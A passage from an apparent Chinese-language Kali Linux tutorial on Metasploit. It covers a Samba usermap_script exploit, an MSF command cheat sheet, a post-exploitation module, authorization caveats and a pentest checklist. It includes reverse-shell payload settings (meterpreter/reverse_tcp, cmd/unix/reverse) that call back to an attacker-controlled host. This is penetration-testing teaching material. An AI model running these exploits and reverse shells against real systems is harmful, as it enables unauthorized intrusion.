<span class="token builtin class-name">set RHOSTS <span class="token operator">&lt;目标IP<span class="token operator">&gt;
<span class="token builtin class-name">set LHOST <span class="token operator">&lt;攻击机IP<span class="token operator">&gt;
<span class="token builtin class-name">set LPORT <span class="token number">4444
<span class="token builtin class-name">set payload windows/x64/meterpreter/reverse_tcp
check
exploit</span></span></span></span></span></span></span></span></span></pre>
</div>

<h1><span>12. 示例二：Samba usermap_script 利用流程</span></h1>
<h2><span>12.1 搜索与选用</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>msfconsole
search samba usermap_script
use exploit/multi/samba/usermap_script</pre>
</div>
<h2><span>12.2 配置与执行</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token builtin class-name">set RHOSTS <span class="token operator">&lt;目标IP<span class="token operator">&gt;
<span class="token builtin class-name">set payload cmd/unix/reverse
<span class="token builtin class-name">set LHOST <span class="token operator">&lt;攻击机IP<span class="token operator">&gt;
<span class="token builtin class-name">set LPORT <span class="token number">4444
show options
exploit</span></span></span></span></span></span></span></span></span></pre>
</div>
<h2><span>12.3 成功后验证</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre><span class="token function">whoami
<span class="token function">id</span></span></pre>
</div>
<p class="ds-markdown-paragraph"><span>验证是否获得高权限。</span></p>
<hr>
<h1><span>13. 常见参数与命令速查</span></h1>
<h2><span>13.1 MSF 核心命令</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">bash</span></div>
</div>
</div>
</div>
<pre>msfconsole                 <span class="token comment"># 启动 MSF
search <span class="token operator">&lt;关键字<span class="token operator">&gt;            <span class="token comment"># 搜索模块
use <span class="token operator">&lt;模块路径<span class="token operator">&gt;             <span class="token comment"># 选用模块
show options               <span class="token comment"># 查看参数
show payloads              <span class="token comment"># 查看可用 Payload
show targets               <span class="token comment"># 查看目标类型
<span class="token builtin class-name">set <span class="token operator">&lt;参数<span class="token operator">&gt; <span class="token operator">&lt;值<span class="token operator">&gt;            <span class="token comment"># 设置参数
setg <span class="token operator">&lt;参数<span class="token operator">&gt; <span class="token operator">&lt;值<span class="token operator">&gt;           <span class="token comment"># 设置全局参数
check                      <span class="token comment"># 漏洞检测（部分模块支持）
run / exploit              <span class="token comment"># 执行利用
exploit <span class="token parameter variable">-j                 <span class="token comment"># 后台执行
sessions <span class="token parameter variable">-l                <span class="token comment"># 列出会话
sessions <span class="token parameter variable">-i <span class="token operator">&lt;ID<span class="token operator">&gt;           <span class="token comment"># 进入会话
background / <span class="token function">bg            <span class="token comment"># 会话后台化</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre>
</div>

<h2><span>13.3 后渗透模块示例</span></h2>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">

</div>
</div>
</div>
<pre>use post/multi/recon/local_exploit_suggester
<span class="token builtin class-name">set <span class="token environment constant">SESSION <span class="token operator">&lt;会话ID<span class="token operator">&gt;
run</span></span></span></span></pre>
</div>
<hr>
<h1><span>14. 注意事项与安全边界</span></h1>
<ul>
<li>
<p class="ds-markdown-paragraph"><span>只能在自有靶机或书面授权范围内测试；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>不要对生产系统随意执行 <code>exploit</code><span>，可能导致服务中断；</span></span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>利用成功不代表可以随意操作，后渗透阶段也要受控；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>建议同步抓包或记录日志，用于复盘、告警验证和防御加固；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>权限维持、凭证收集、横向移动属于高风险操作，必须明确授权并保留审计记录；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>清理痕迹应合法合规，并在授权范围内记录操作；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>报告应包含修复建议与复测结果；</span></p>
</li>
<li>
<p class="ds-markdown-paragraph"><span>防御建议包括：打补丁、关闭不必要端口、升级服务版本、加固防火墙策略、最小权限、日志监控与告警验证。</span></p>
</li>
</ul>
<hr>
<h1><span>15. 最终检查清单</span></h1>
<div class="md-code-block md-code-block-light">
<div class="md-code-block-banner-wrap">
<div class="md-code-block-banner md-code-block-banner-lite">
<div class="_121d384">
<div class="d2a24f03"><span class="d813de27">text</span></div>
</div>
</div>
</div>
<pre>[ ] 已获得书面授权/明确靶场范围
[ ] 已记录目标 IP、端口、时间、操作命令
[ ] 已完成端口与服务扫描
[ ] 已进行漏洞确认，而非直接 exploit
[ ] 已选择合适 exploit 模块与 Payload
[ ] 已检查 show options 并配置 RHOSTS/LHOST/LPORT
[ ] 已执行 check（如模块支持）
[ ] 已执行 exploit/run 并获取会话
[ ] 已用 sessions -l / sessions -i 管理会话
[ ] 已进行受控后渗透与提权验证
[ ] 已记录证据、截图、日志或抓包
[ ] 已清理测试账号/文件/后门并恢复环境
[ ] 已输出报告、影响评估、修复建议与复测结果</pre>
</div>
<p class="ds-markdown-paragraph"><span>以上流程将“信息收集 → 漏洞确认 → 模块选择 → 参数配置 → 执行利用 → 后渗透/提权 → 痕迹清理与报告”的主线，与 MSF 的“搜索模块 → 选用模块 → 查看选项 → 配置参数 → 选择载荷 → 执行利用 → 会话管理”的操作细节融合在一起，可作为 Kali Linux 授权靶场环境下 MSF 漏洞利用测试的完整参考流程。</span></p>

</div>
